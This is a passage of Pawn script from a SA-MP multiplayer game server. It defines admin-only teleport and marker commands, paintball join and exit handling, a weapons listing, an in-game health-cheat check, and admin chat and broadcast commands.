			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}

		else if(strcmp(params,"sf",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, -1417.0,-295.8,14.1);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, -1417.0,-295.8,14.1);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to San Fierro.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"custom",true) == 0) {
		    new
		        iInterior,
		        Float: fPos[3];

			strdel(params, 0, 6); // remove 'custom' and space after
			sscanf(params, "fffi", fPos[0], fPos[1], fPos[2], iInterior);
			SetPlayerPos(playerid, fPos[0], fPos[1], fPos[2]);
			SetPlayerInterior(playerid, iInterior);
		}
		else if(strcmp(params,"trucker",true) == 0) {
		 	if(GetPlayerState(playerid) == 2) {
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, -1549.33, 112.50, 3.12);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else {
				SetPlayerPos(playerid, -1549.33, 112.50, 3.12);
			}

			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to the Trucker Job area.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"lv",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1699.2, 1435.1, 10.7);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 1699.2,1435.1, 10.7);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to Las Venturas.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"bank",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1487.91, -1030.60, 23.66);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 1487.91, -1030.60, 23.66);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to the Bank of Los Santos.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"allsaints",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1192.78, -1292.68, 13.38);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 1192.78, -1292.68, 13.38);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to All Saints General Hospital.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"countygen",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 2000.05, -1409.36, 16.99);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 2000.05, -1409.36, 16.99);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to County General Hospital.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"gym",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 2227.60, -1674.89, 14.62);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 2227.60, -1674.89, 14.62);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to Ganton Gym.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
   		}
		else if(strcmp(params,"fbi",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 344.77,-1526.08,33.28);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 344.77,-1526.08,33.28);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to the FBI.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
  		else if(strcmp(params,"rc",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1253.70, 343.73, 19.41);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 1253.70, 343.73, 19.41);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to Red County.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
   		}
		else if(strcmp(params,"prison",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 112.67, 1917.55, 18.72);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 112.67, 1917.55, 18.72);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to Fort DeMorgan Prison.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"stadium1",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, -1424.93, -664.59, 1059.86);
				LinkVehicleToInterior(tmpcar, 4);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, -1424.93, -664.59, 1059.86);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to Stadium 1.");
			SetPlayerInterior(playerid,4);
			PlayerInfo[playerid][pInt] = 4;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"stadium2",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, -1395.96, -208.20, 1051.28);
				LinkVehicleToInterior(tmpcar, 7);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, -1395.96, -208.20, 1051.28);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to Stadium 2.");
			SetPlayerInterior(playerid,7);
			PlayerInfo[playerid][pInt] = 7;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"stadium3",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, -1410.72, 1591.16, 1052.53);
				LinkVehicleToInterior(tmpcar, 14);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, -1410.72, 1591.16, 1052.53);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to Stadium 3.");
			SetPlayerInterior(playerid,14);
			PlayerInfo[playerid][pInt] = 14;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"stadium4",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, -1394.20, 987.62, 1023.96);
				LinkVehicleToInterior(tmpcar, 15);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
    		}
			else
			{
				SetPlayerPos(playerid, -1394.20, 987.62, 1023.96);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to Stadium 4.");
			SetPlayerInterior(playerid,15);
			PlayerInfo[playerid][pInt] = 15;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"int1",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1416.107000,0.268620,1000.926000);
				LinkVehicleToInterior(tmpcar, 1);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 1416.107000,0.268620,1000.926000);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to Interior 1.");
			SetPlayerInterior(playerid,1);
			PlayerInfo[playerid][pInt] = 1;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
		else if(strcmp(params,"mark",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
				LinkVehicleToInterior(tmpcar, TeleportDestInt[playerid]);
			}
			else
			{
				SetPlayerPos(playerid, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
			}
			SetPlayerInterior(playerid,TeleportDestInt[playerid]);
			PlayerInfo[playerid][pInt] = TeleportDestInt[playerid];
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to your marker.");
		}
		else if(strcmp(params,"mark2",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, TeleportDest2[playerid][0],TeleportDest2[playerid][1],TeleportDest2[playerid][2]);
				LinkVehicleToInterior(tmpcar, TeleportDestInt2[playerid]);
			}
			else
			{
				SetPlayerPos(playerid, TeleportDest2[playerid][0],TeleportDest2[playerid][1],TeleportDest2[playerid][2]);
			}
			SetPlayerInterior(playerid,TeleportDestInt2[playerid]);
			PlayerInfo[playerid][pInt] = TeleportDestInt2[playerid];
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to your second marker.");
		}
		else if(strcmp(params,"mall",true) == 0)
		{
		 	if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1133.71,-1464.52,15.77);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0;TelePos[playerid][0] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 1133.71,-1464.52,15.77);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to the Mall.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			PlayerInfo[playerid][pVW] = 0;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:mark(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
        GetPlayerPos(playerid, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
        TeleportDestInt[playerid] = GetPlayerInterior(playerid);
        SendClientMessage(playerid, COLOR_GRAD1, "Teleporter destination set!");
    }
    else {
        SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
    }
    return 1;
}

CMD:mark2(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
        GetPlayerPos(playerid, TeleportDest2[playerid][0],TeleportDest2[playerid][1],TeleportDest2[playerid][2]);
        TeleportDestInt2[playerid] = GetPlayerInterior(playerid);
        SendClientMessage(playerid, COLOR_GRAD1, "Teleporter destination set!");
    }
    else {
        SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
    }
    return 1;
}

CMD:exitpaintball(playerid, params[]) {
    if(GetPVarInt(playerid, "PBM") > 0) {
        if(GetPVarInt(playerid, "OPD") == 1)
            return SendClientMessage(playerid, COLOR_GREY, "You're dead, please wait a few seconds and then try quit again.");

	  	SetPlayerPos(playerid, 1295.90, -1424.05, 14.95);
	    SetPlayerInterior(playerid, 0);
	    SetPlayerVirtualWorld(playerid, 0);

		LoadObjectsForPlayer(playerid);

		new
		    szMessage[64];

		format(szMessage, sizeof(szMessage), "%s has left the paintball game.", GetPlayerNameEx(playerid));
		foreach(Player, i) {
			if(GetPVarInt(i, "PBM") > 0 && GetPVarInt(i, "PBM") == GetPVarInt(playerid, "PBM") && i != playerid)
			    SendClientMessage(i, COLOR_RED, szMessage);
		}
		DeletePVar(playerid, "PBM");
		DeletePVar(playerid, "PBMK");
		DeletePVar(playerid, "PBMD");
		DeletePVar(playerid, "PBMS");
		DeletePVar(playerid, "IsFrozen");
		if(PaintballTeam[playerid] != 0) {
		    SetPlayerToTeamColor(playerid);
		    PaintballTeam[playerid] = 0;
		}

		SetPlayerHealth(playerid, GetPVarFloat(playerid, "pbhealth"));
		SetPlayerArmourEx(playerid, GetPVarFloat(playerid, "pbarmour"));

		ResetPlayerWeapons(playerid);
		SetPlayerTeam(playerid, -1);
		PlayerInfo[playerid][pAGuns][0] = 0;
		PlayerInfo[playerid][pAGuns][1] = 0;
		PlayerInfo[playerid][pAGuns][2] = 0;
		PlayerInfo[playerid][pAGuns][3] = 0;
		PlayerInfo[playerid][pAGuns][4] = 0;
		PlayerInfo[playerid][pAGuns][5] = 0;
		PlayerInfo[playerid][pAGuns][6] = 0;
		PlayerInfo[playerid][pAGuns][7] = 0;
		PlayerInfo[playerid][pAGuns][8] = 0;
		PlayerInfo[playerid][pAGuns][9] = 0;
		PlayerInfo[playerid][pAGuns][10] = 0;
		PlayerInfo[playerid][pAGuns][11] = 0;
		SetPlayerWeapons(playerid);

		DeletePVar(playerid, "pbhealth");
		DeletePVar(playerid, "pbarmour");

		SendClientMessage(playerid, COLOR_WHITE, "You have quit the paintball game.");
    }
	return 1;
}

CMD:paintball(playerid, params[]) {
    if(PlayerInfo[playerid][pConnectTime] < 2)
        return SendClientMessage(playerid, COLOR_GREY, "You can't play paintball yet. Play 2 full hours first.");

	if(AdminDuty[playerid] != 0)
	    return SendClientMessage(playerid, COLOR_GREY, "You can't play while on admin duty.");

	if(PlayerInfo[playerid][pWantedLevel] >= 1)
	    return SendClientMessage(playerid, COLOR_GREY, "You can't join paintball while you're wanted.");

	if(PlayerCuffed[playerid] > 0 || GetPVarInt(playerid, "Injured") == 1)
		return SendClientMessage(playerid, COLOR_GREY, "You can't do this right now.");

	if(IsPlayerInRangeOfPoint(playerid, 5, 1295.90, -1424.05, 14.95)) {
 		new
			iPlayer = INVALID_PLAYER_ID;

	    foreach(Player, i) {
			if(GetPVarInt(i, "PBM") > 0) {
			    iPlayer = i; // always going to get the highest ID because Y_Less never added a 'break;' for foreach ~_~ ...or didn't document it
			}
	    }

	    new
	        Float: fFloat,
	        Float: aFloat;

	    GetPlayerHealth(playerid, fFloat);
	    GetPlayerArmour(playerid, aFloat);
	    SetPVarFloat(playerid, "pbhealth", fFloat);
	    SetPVarFloat(playerid, "pbarmour", aFloat);

		if(iPlayer == INVALID_PLAYER_ID)
            ShowPlayerDialogEx(playerid, 3652, DIALOG_STYLE_LIST, "Paintball - Game type", "DM\nTDM", "Go", "Cancel");
		else
		    ShowPlayerDialogEx(playerid, 3652, DIALOG_STYLE_LIST, "Paintball - Game type", "DM\nTDM\nRandom (has players in)", "Go", "Cancel");
	} else
	    SendClientMessage(playerid, COLOR_GREY, "You're not in range of the paintball venue.");

	return 1;
}

CMD:listguns(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /listguns [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			new weapons[13][2], weaponname[50];
			if(GetPVarInt(giveplayerid, "EventToken") != 0 || GetPVarInt(giveplayerid, "PBM") > 0)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "That player is at an event/paintball so the weapons may appear as non-server sided.");
			}
			SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
			format(string, sizeof(string), "Weapons on %s:", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);
			for (new i = 0; i < 13; i++)
			{
				GetPlayerWeaponData(giveplayerid, i, weapons[i][0], weapons[i][1]);
				if(weapons[i][0] > 0)
				{
					if(PlayerInfo[giveplayerid][pGuns][i] == weapons[i][0])
					{
						GetWeaponName(weapons[i][0], weaponname, sizeof(weaponname));
						format(string, sizeof(string), "%s (%d).", weaponname, weapons[i][0]);
						SendClientMessage(playerid, COLOR_GRAD1, string);
					}
					else
					{
						GetWeaponName(weapons[i][0], weaponname, sizeof(weaponname));
						format(string, sizeof(string), "%s (%d) (non server-side).", weaponname, weapons[i][0]);
						SendClientMessage(playerid, COLOR_GRAD1, string);
					}
				}
			}
			SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:hhc(playerid, params[])
{
	return cmd_hhcheck(playerid, params);
}

CMD:hhcheck(playerid, params[])
{
	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /hhcheck [playerid/partofname]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(PlayerInfo[playerid][pAdmin] >= 2)
		{
			if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    	{
	        	SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
				return 1;
	    	}
		    if(HHcheckFloats[giveplayerid][0] != 0)
		    {
		        SendClientMessage(playerid, COLOR_WHITE, "That player is currently being checked for health hacks!");
		        return 1;
		    }
			if(PlayerInfo[giveplayerid][pAdmin] >= PlayerInfo[playerid][pAdmin] && AdminDuty[giveplayerid] == 1)
			{
				SendClientMessage(playerid, COLOR_WHITE, "You can't perform this action on an equal or higher level admin that is on-duty.");
				return 1;
			}
   			if(playerTabbed[giveplayerid] != 0)
   			{
      			SendClientMessage(playerid, COLOR_WHITE, "That player is currently alt-tabbed!");
		        return 1;
   			}
			if(HHcheckUsed != 0)
		    {
		        SendClientMessage(playerid, COLOR_WHITE, "The health hack check is being used by another admin, please try again in a moment!");
		        return 1;
		    }

   			HHcheckUsed = 1;

        	format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s has initiated a health hack check on %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
        	ABroadCast(COLOR_YELLOW, string, 1);

  			format(string, sizeof(string), "Checking %s for health hacks, please wait....", GetPlayerNameEx(giveplayerid));
		    SendClientMessage(playerid, COLOR_YELLOW, string);

			GetPlayerHealth(giveplayerid, HHcheckFloats[giveplayerid][0]);
			GetPlayerArmour(giveplayerid, HHcheckFloats[giveplayerid][1]);
			GetPlayerPos(giveplayerid, HHcheckFloats[giveplayerid][2], HHcheckFloats[giveplayerid][3], HHcheckFloats[giveplayerid][4]);
			GetPlayerFacingAngle(giveplayerid, HHcheckFloats[giveplayerid][5]);
			HHcheckVW[giveplayerid] = GetPlayerVirtualWorld(giveplayerid);
			HHcheckInt[giveplayerid] = GetPlayerInterior(giveplayerid);

			DeletePVar(giveplayerid, "IsFrozen");
			TogglePlayerControllable(giveplayerid, 1);

            SetPlayerCameraPos(giveplayerid, 785.1896,1692.6887,5.2813);
			SetPlayerCameraLookAt(giveplayerid, 785.1896,1692.6887,0);
            SetPlayerVirtualWorld(giveplayerid, 0);
		    SetPlayerInterior(giveplayerid, 1);
		    SetPlayerHealth(giveplayerid, 100);
		    SetPlayerArmourEx(giveplayerid, 0);
			SetPlayerPos(giveplayerid, -1400.994873, 106.899650, 1032.273437);
			SetPlayerFacingAngle(giveplayerid, 90.66);
			CreateExplosion(-1400.994873, 106.899650 , 1032.273437, 8, 20);

			SetTimerEx("HealthHackCheck", 1250, 0, "dd", playerid, giveplayerid);
		}
		else SendClientMessage(playerid, COLOR_GREY, "You're not authorized to use that command!");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	return 1;
}

forward HealthHackCheck(playerid, giveplayerid);
public HealthHackCheck(playerid, giveplayerid)
{
	new string[128];
 	if(giveplayerid == INVALID_PLAYER_ID)
    {
        SendClientMessage(playerid, COLOR_YELLOW, "The health hack check result could not be made, the player logged off.");
        HHcheckUsed = 0;
        return 1;
    }
	if(playerTabbed[giveplayerid] != 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "The health hack check result could not be made, the player alt-tabbed.");

		SetPlayerHealth(giveplayerid, HHcheckFloats[giveplayerid][0]);
		SetPlayerArmourEx(giveplayerid, HHcheckFloats[giveplayerid][1]);
		SetPlayerPos(giveplayerid, HHcheckFloats[giveplayerid][2], HHcheckFloats[giveplayerid][3], HHcheckFloats[giveplayerid][4]);
		SetPlayerFacingAngle(giveplayerid, HHcheckFloats[giveplayerid][5]);
		SetCameraBehindPlayer(giveplayerid);
		SetPlayerVirtualWorld(giveplayerid, HHcheckVW[giveplayerid]);
 		SetPlayerInterior(giveplayerid, HHcheckInt[giveplayerid]);

  		for(new i = 0; i < 6; i++)
		{
			HHcheckFloats[giveplayerid][i] = 0;
		}
		HHcheckVW[giveplayerid] = 0;
		HHcheckInt[giveplayerid] = 0;

		HHcheckUsed = 0;
  		return 1;
	}
    if(!IsPlayerInRangeOfPoint(giveplayerid,20,-1400.994873, 106.899650, 1032.273437))
    {
        SendClientMessage(playerid, COLOR_WHITE, "The health hack check result could not be made, the player was probably desynced/lagging.");

		SetPlayerHealth(giveplayerid, HHcheckFloats[giveplayerid][0]);
		SetPlayerArmourEx(giveplayerid, HHcheckFloats[giveplayerid][1]);
		SetPlayerPos(giveplayerid, HHcheckFloats[giveplayerid][2], HHcheckFloats[giveplayerid][3], HHcheckFloats[giveplayerid][4]);
		SetPlayerFacingAngle(giveplayerid, HHcheckFloats[giveplayerid][5]);
		SetCameraBehindPlayer(giveplayerid);
		SetPlayerVirtualWorld(giveplayerid, HHcheckVW[giveplayerid]);
 		SetPlayerInterior(giveplayerid, HHcheckInt[giveplayerid]);

  		for(new i = 0; i < 6; i++)
		{
			HHcheckFloats[giveplayerid][i] = 0;
		}
		HHcheckVW[giveplayerid] = 0;
		HHcheckInt[giveplayerid] = 0;

        HHcheckUsed = 0;
		return 1;
    }

    new Float:health;
    GetPlayerHealth(giveplayerid, health);
    if(health == 100)
	{
        SendClientMessage(playerid, COLOR_GREEN, "____________________ HEALTH HACK CHECK RESULT_______________");
        format(string, sizeof(string), "The health hack check on %s was {00F70C}positive{FFFFFF}. The player may be health hacking.", GetPlayerNameEx(giveplayerid));
        SendClientMessage(playerid, COLOR_WHITE, string);
        SendClientMessage(playerid, COLOR_WHITE, "Health before check: 100.0");
        format(string, sizeof(string), "Health after check: %.1f", health);
        SendClientMessage(playerid, COLOR_WHITE, string);
        SendClientMessage(playerid, COLOR_GREEN, "_______________________________________________________________");
    }
    else
	{
        SendClientMessage(playerid, COLOR_GREEN, "____________________ HEALTH HACK CHECK RESULT_______________");
        format(string, sizeof(string), "The health hack check on %s was {FF0606}negative{FFFFFF}. The player was not health hacking.", GetPlayerNameEx(giveplayerid));
        SendClientMessage(playerid, COLOR_WHITE, string);
        SendClientMessage(playerid, COLOR_WHITE, "Health before check: 100.0");
        format(string, sizeof(string), "Health after check: %.1f", health);
        SendClientMessage(playerid, COLOR_WHITE, string);
        SendClientMessage(playerid, COLOR_GREEN, "_______________________________________________________________");
    }

	SetPlayerHealth(giveplayerid, HHcheckFloats[giveplayerid][0]);
	SetPlayerArmourEx(giveplayerid, HHcheckFloats[giveplayerid][1]);
	SetPlayerPos(giveplayerid, HHcheckFloats[giveplayerid][2], HHcheckFloats[giveplayerid][3], HHcheckFloats[giveplayerid][4]);
	SetPlayerFacingAngle(giveplayerid, HHcheckFloats[giveplayerid][5]);
	SetCameraBehindPlayer(giveplayerid);
	SetPlayerVirtualWorld(giveplayerid, HHcheckVW[giveplayerid]);
 	SetPlayerInterior(giveplayerid, HHcheckInt[giveplayerid]);

  	for(new i = 0; i < 6; i++)
	{
		HHcheckFloats[giveplayerid][i] = 0;
	}
	HHcheckVW[giveplayerid] = 0;
	HHcheckInt[giveplayerid] = 0;

    HHcheckUsed = 0;
    return 1;
}

CMD:a(playerid, params[])
{
	return cmd_admin(playerid, params);
}

CMD:admin(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1) {
		if(!isnull(params)) {
			new szMessage[128];
			format(szMessage, sizeof(szMessage), "* Level %d Admin %s: %s", PlayerInfo[playerid][pAdmin], GetPlayerNameEx(playerid), params);
			ABroadCast(COLOR_YELLOW, szMessage, 1);
		}
		else SendClientMessage(playerid, COLOR_WHITE, "USAGE: (/a)dmin [admin chat]");
	}
	return 1;
}

CMD:cnn(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		if(!isnull(params)) {

			new
				szMessage[128];

			format(szMessage, sizeof(szMessage), "~b~%s: ~w~%s",GetPlayerNameEx(playerid), params);
			foreach(Player, i) GameTextForPlayer(i, szMessage, 5000, 6);
		}
		else SendClientMessage(playerid, COLOR_WHITE, "USAGE: /cnn [message]. ~n~ = new line, ~r~ = red, ~g~ = green, ~b~ = blue, ~w~ = white, ~y~ = yellow.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	return 1;
}

